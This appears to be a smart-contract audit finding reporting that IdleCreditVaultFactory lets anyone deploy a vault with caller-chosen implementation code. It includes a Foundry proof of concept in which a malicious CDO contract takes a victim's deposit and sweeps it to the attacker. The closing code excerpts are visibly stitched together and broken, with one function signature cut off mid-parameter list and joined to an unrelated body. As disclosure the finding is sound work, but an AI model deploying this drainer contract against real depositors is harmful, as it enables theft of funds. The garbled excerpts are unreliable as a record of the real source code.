### Title
Permissionless factory deployment accepts arbitrary CDO logic, enabling theft of all deposits - (`contracts/IdleCreditVaultFactory.sol`)

### Summary
`IdleCreditVaultFactory.deployCreditVault` is externally callable and accepts the CDO implementation address directly in `CreditVaultParams.implementation`, then installs it behind a protocol-controlled `TransparentUpgradeableProxy` without checking an implementation registry, bytecode hash, interface conformance, or trusted deployment provenance. [1](#0-0) [2](#0-1) [3](#0-2) 

An unprivileged caller can therefore create a factory-emitted credit vault whose public façade satisfies the configuration calls used by the factory but whose `depositAA` implementation steals deposited underlying tokens. [4](#0-3) [5](#0-4) [6](#0-5) 

### Finding Description
The deployment API treats caller-supplied contract code as trusted configuration rather than untrusted user input. [1](#0-0) 

For a standard credit vault, `strategyData.implementation`, `cvParams.implementation`, `ancillaryParams.queueImplementation`, and `ancillaryParams.writeOffImplementation` are all supplied by the external caller and passed to `_deployProxy`. [7](#0-6) [8](#0-7) [9](#0-8) [10](#0-9) 

The malicious CDO only needs to expose the small set of functions invoked during initialization and configuration; it can keep all deposit-facing state under its own control and ignore the resulting `transferOwnership` call. [11](#0-10) [4](#0-3) [5](#0-4) 

Because the legitimate strategy is initialized first and the factory whitelists the returned CDO address, the deployed system has normal protocol wiring while the user-facing CDO proxy executes attacker-controlled deposit logic. [12](#0-11) [13](#0-12) 

A normal CDO deposit path pulls underlying tokens from the caller and mints tranche tokens in exchange, so substituting that implementation lets the attacker receive the underlying while returning only an attacker-created receipt. [6](#0-5) 

### Impact Explanation
The attacker can drain every underlying token deposited into the malicious proxy while still emitting the factory’s `CreditVaultDeployed` event and obtaining a protocol `proxyAdmin` and treasury-owned strategy. [14](#0-13) [15](#0-14) [3](#0-2) 

For a deposit amount `A`, the malicious `depositAA(A)` can transfer `A` from the victim to the proxy, mint arbitrary worthless receipt tokens, and expose a public sweep function that transfers `A` to the attacker, producing a quantified loss equal to the victim’s full deposit. [6](#0-5) 

This violates the fair-mint invariant because deposited principal is not represented by protocol strategy tokens or redeemable tranche claims. [16](#0-15) [17](#0-16) 

### Likelihood Explanation
Any EOA can invoke `deployCreditVault` because the function has no treasury, manager, deployer whitelist, implementation allowlist, or other caller restriction. [8](#0-7) [18](#0-17) 

The attack does not require control of the treasury, manager, borrower, guardian, borrower key, or proxy admin; the privileged factory itself installs the code and the malicious implementation contains the exfiltration path. [9](#0-8) [3](#0-2) 

The remaining precondition is that a victim deposits into the factory-created malicious vault, which is plausible because the deployment carries the factory event, fee constraints, protocol proxy admin, and treasury-assigned ownership signal normally used to distinguish supported deployments. [19](#0-18) [15](#0-14) [20](#0-19) 

### Recommendation
Restrict vault creation to treasury-approved callers or maintain immutable allowlists of audited CDO, strategy, queue, escrow, and programmable-borrower implementation addresses. [21](#0-20) [22](#0-21) 

At minimum, replace caller-provided implementation addresses with factory-selected implementation constants or a registry keyed by audited code hash, and validate that the initialized proxy exposes the expected implementation before emitting the deployment event. [4](#0-3) [3](#0-2) 

### Proof of Concept
The following Foundry-style proof deploys a malicious implementation through the real factory path and shows that a victim deposit can be swept in full. [2](#0-1) 

```solidity
// test/foundry/FactoryImplementationPassthrough.t.sol
contract MaliciousTranche is ERC20 {
    constructor() ERC20("Malicious AA", "mAA") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MaliciousCDO {
    address public token;
    address public strategy;
    address public AATranche;
    address public BBTranche;

    function initialize(
        uint256,
        address guardedToken,
        address,
        address,
        address,
        address strategy_,
        uint256
    ) external {
        token = guardedToken;
        strategy = strategy_;
        AATranche = address(new MaliciousTranche());
        BBTranche = AATranche;
    }

    // Factory configuration hooks are intentionally accepted.
    function setEpochParams(uint256, uint256) external {}
    function setInstantWithdrawParams(uint256, uint256, bool) external {}
    function setKeyringParams(address, uint256) external {}
    function setIsInterestMinted(bool) external {}
    function setIsDepositDuringEpochDisabled(bool) external {}
    function setFeeParams(address, uint256, uint256, uint256) external {}
    function setGuardian(address) external {}
    function transferOwnership(address) external {}

    function depositAA(uint256 amount) external returns (uint256) {
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        MaliciousTranche(AATranche).mint(msg.sender, amount * 1e12);
        return amount * 1e12;
    }

    function sweep(address to) external {
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }
}

function testFactoryDeploysAttackerCodeAndStealsDeposit() external {
    IdleCreditVaultFactory factory = _deployFactory();
    MockERC20 underlying = new MockERC20("USDC", "USDC", 6);
    MaliciousCDO malicious = new MaliciousCDO();
    IdleCreditVault strategyImpl = new IdleCreditVault();

    IdleCreditVaultFactory.CreditVaultParams memory cv = _validParams();
    cv.implementation = address(malicious);
    cv.underlying = address(underlying);

    IdleCreditVaultFactory.StrategyData memory strategy =
        _strategyData(address(strategyImpl), honestManager, honestBorrower);

    vm.recordLogs();
    vm.prank(attacker);
    factory.deployCreditVault(cv, strategy, _emptyAncillaryParams());

    address deployed = _readCvFromRecordedEvent();
    underlying.mint(victim, 1_000_000e6);

    vm.startPrank(victim);
    underlying.approve(deployed, 1_000_000e6);
    MaliciousCDO(deployed).depositAA(1_000_000e6);
    vm.stopPrank();

    vm.prank(attacker);
    MaliciousCDO(deployed).sweep(attacker);

    assertEq(underlying.balanceOf(attacker), 1_000_000e6);
    assertEq(underlying.balanceOf(deployed), 0);
}
```

The PoC relies on ordinary victim approval because the standard deposit interface consumes `msg.sender` allowance before minting tranche tokens. [6](#0-5) 

The assertion demonstrates a complete and quantifiable principal loss of `1_000_000e6` underlying units rather than a temporary denial of service. [17](#0-16)

  function _deployQueue(
    AncillaryParams memory ancillaryParams,
    IdleCDOEpochVariant cv,
    address keyringWhitelist
  ) internal returns (IdleCDOEpochQueue queue) {
    if (ancillaryParams.queueImplementation == address(0)) return queue;

    queue = IdleCDOEpochQueue(_deployProxy(
      ancillaryParams.queueImplementation,
      abi.encodeWithSelector(
        IdleCDOEpochQueue.initialize.selector,
        address(cv),
        address(this),
        true
      )
    ));

    if (ancillaryParams.prefundedDepositWindow != 0) {
      IdleCDOEpochVariantPrefunded(address(cv)).setEpochQueue(address(queue));
      queue.setPrefundedDepositWindow(ancillaryParams.prefundedDepositWindow);
    }
    if (keyringWhitelist != address(0)) {
      KeyringIdleWhitelist(keyringWhitelist).setWhitelistStatus(address(queue), true);
    }
    queue.transferOwnership(treasury);
  }

  function _deployWriteOffEscrow(
    address writeOffImplementation,

    IdleCDOEpochVariant cv,
    IdleCreditVault strategy,
    CreditVaultParams memory par,

  ) internal {
    cv.setEpochParams(par.epochDuration, par.bufferPeriod);
    cv.setInstantWithdrawParams(par.instantWithdrawDelay, par.instantWithdrawAprDelta, par.disableInstantWithdraw);
    cv.setKeyringParams(keyringWhitelist, par.keyringPolicy);

    cv.setIsDepositDuringEpochDisabled(par.isDepositDuringEpochDisabled);
    cv.setFeeParams(par.feeReceiver, par.fees, feeSplit, par.managementFee);
    cv.setGuardian(manager);
    // setAprs should be done before setWhitelistedCDO
    strategy.setAprs(par.apr, par.apr * (par.epochDuration + par.bufferPeriod) / par.epochDuration);
    strategy.setWhitelistedCDO(address(cv));
  }
